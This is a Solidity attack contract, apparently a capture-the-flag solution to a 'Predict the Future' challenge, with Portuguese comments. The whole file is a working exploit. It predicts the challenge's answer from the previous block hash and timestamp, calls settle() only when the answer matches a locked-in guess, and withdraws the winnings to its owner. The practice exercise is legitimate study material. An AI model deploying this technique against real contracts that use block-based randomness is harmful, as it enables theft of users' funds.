pragma solidity ^0.4.21;


contract PredictTheFutureChallenge {
    function lockInGuess(uint8 n) public payable;
    function settle() public;
}

contract AttackPredictTheFuture {
    PredictTheFutureChallenge public challenge;
    uint8 public guess = 0; 
    address public owner;


    function AttackPredictTheFuture(address _challenge) public {
        challenge = PredictTheFutureChallenge(_challenge);
        owner = msg.sender;
    }

    // trava o palpite no contrato do desafio
    function lockInGuess() public payable {
        require(msg.value == 1 ether);
        // repassa 1 ETH para o desafio e registra o palpite
        challenge.lockInGuess.value(1 ether)(guess);
    }

    // tenta resolver: só chama settle se a resposta prevista == guess
    function attack() public {
        // calcula a mesma resposta que o desafio vai calcular
        uint8 answer = uint8(
            keccak256(block.blockhash(block.number - 1), now)
        ) % 10;

        if (answer == guess) {
            // chama se deu certo
            challenge.settle();
        }
    }

    // saca fundos do contrato atacante para o owner
    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }

    // fallback para receber os 2 ETH se acertar
    function () public payable {}
}
